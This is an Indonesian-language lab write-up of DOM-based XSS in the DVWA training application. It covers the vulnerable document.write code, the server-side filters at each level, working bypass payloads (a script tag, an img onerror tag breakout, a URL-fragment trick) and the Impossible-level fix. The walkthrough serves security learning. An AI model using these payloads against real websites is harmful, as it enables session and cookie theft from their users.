## **1. Deskripsi Vulnerability**

**DOM Based XSS** adalah kerentanan keamanan di mana skrip berbahaya dieksekusi sebagai hasil dari manipulasi **Document Object Model (DOM)** oleh JavaScript di sisi klien. Berbeda dengan XSS lainnya, DOM XSS terjadi sepenuhnya di browser tanpa melibatkan pemrosesan server pada payload.

**Karakteristik Unik DVWA DOM XSS:**
- Menggunakan `document.write()` untuk menulis ke DOM
- Membaca input langsung dari `document.location.href`
- Tidak ada sanitasi pada sisi klien

---

## **2. Analisis Kode Vulnerable**

### **Kode JavaScript yang Sama di Semua Level:**

```javascript
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    document.write("<option value='' disabled='disabled'>----</option>");
}
```

### **Breakdown Vulnerable Code:**

#### **Source:**
```javascript
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
```
- Membaca parameter `default` dari URL
- **Tidak ada validasi atau sanitasi**

#### **Sink:**
```javascript
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```
- **Concatenation langsung** ke string HTML
- **Double write**: value dan text content
- Menggunakan `decodeURI()` tapi tidak cukup

#### **Vulnerability Pattern:**
```
document.write("<option value='" + USER_INPUT + "'>" + USER_INPUT + "</option>");
```

## **3. Eksploitasi per Level (Dengan Analisis Kode)**

### **Level Low**

 
```
# No protections, anything goes
```

**Payload Analysis:**

```javascript
// Input: English<script>alert(1)</script>
// Hasil kode:
document.write("<option value='" + "English<script>alert(1)</script>" + "'>" 
              + decodeURI("English<script>alert(1)</script>") + "</option>");

// Output HTML:
<option value='English<script>alert(1)</script>'>English<script>alert(1)</script></option>
```

1. **Basic:**
   ```
   English<script>alert(document.cookie)</script>
   ```

### **Level Medium**

**Kode Server:**
```php
if (stripos ($default, "<script") !== false) {
    header ("location: ?default=English");
    exit;
}
```

**Bypass Analysis:**
Server memfilter string `<script` tapi **kode client-side sama persis** dengan Low level!

**Payload Bypass:**

```
English></option></select><img src='x' onerror='alert(document.cookie)'>
```

![tampilan-xss](/assets/image/2026-02-08-xss-dom/image6.png)
![tampilan-xss](/assets/image/2026-02-08-xss-dom/image5.png)


**Analisis Kode:**

```javascript
// Input: English></option></select><img src='x' onerror='alert(1)'>
document.write("<option value='" + "English></option></select><img src='x' onerror='alert(1)>" + "'>" 
              + decodeURI("English></option></select><img src='x' onerror='alert(1)>") + "</option>");

// Output HTML:
<option value='English></option></select><img src='x' onerror='alert(1)>'>
English></option></select><img src='x' onerror='alert(1)>
</option>
```

**Hasil DOM:**
```html
<select>
  <option value='English></option></select><img src='x' onerror='alert(1)>'>
  English></option></select><img src='x' onerror='alert(1)>
  </option>
  <option value='' disabled='disabled'>----</option>
  <option value='English'>English</option>
  <option value='French'>French</option>
  <option value='Spanish'>Spanish</option>
  <option value='German'>German</option>
</select>
```

**Mengapa Berhasil:**
1. Menutup tag `</option>` dan `</select>` prematur
2. Menyisipkan tag `<img>` dengan event handler
3. Server tidak filter karena tidak ada `<script`

### **Level: High**

**Kode Server:**
```php
switch ($_GET['default']) {
    case "French":
    case "English":
    case "German":
    case "Spanish":
        # ok
        break;
    default:
        header ("location: ?default=English");
        exit;
}
```

**Analisis:** Whitelist ketat di server-side!

**Bypass dengan URL Fragment:**

```
http://dvwa/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie)</script>
```

![tampilan-xss](/assets/image/2026-02-08-xss-dom/image7.png)
![tampilan-xss](/assets/image/2026-02-08-xss-dom/image8.png)

**Mengapa Berhasil:**

1. **Kode JavaScript tetap sama:**
   ```javascript
   var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
   ```
   
2. **`document.location.href` berisi FULL URL termasuk fragment:**
   ```
   document.location.href = "http://dvwa/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>"
   ```

3. **Substring operation:**
   ```javascript
   // Hasil substring:
   "English#<script>alert(1)</script>"
   ```

4. **`document.write()` menghasilkan:**
   ```html
   <option value='English#<script>alert(1)</script>'>English#<script>alert(1)</script></option>
   ```

**Payload Lainnya:**

```
#<img src=x onerror=alert(1)>
```

![tampilan-xss](/assets/image/2026-02-08-xss-dom/image9.png)
![tampilan-xss](/assets/image/2026-02-08-xss-dom/image10.png)

**Catatan Penting:** Pada High level, perhatikan kode HTML berbeda:
```html
<!-- HIGH Level: Tidak ada separator setelah custom option -->
<option value='English'>English</option>
<option value='French'>French</option>

<!-- LOW/MEDIUM Level: Ada separator -->
<option value='English'>English</option>
<option value='' disabled='disabled'>----</option>
<option value='English'>English</option>
```

---

### **Level: Impossible**

**Perbedaan Kode JavaScript:**
```javascript
// SEBELUM (vulnerable):
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");

// SESUDAH (impossible):
document.write("<option value='" + lang + "'>" + (lang) + "</option>");
```

**Perubahan:** Hanya `decodeURI(lang)` di bagian `(lang)`
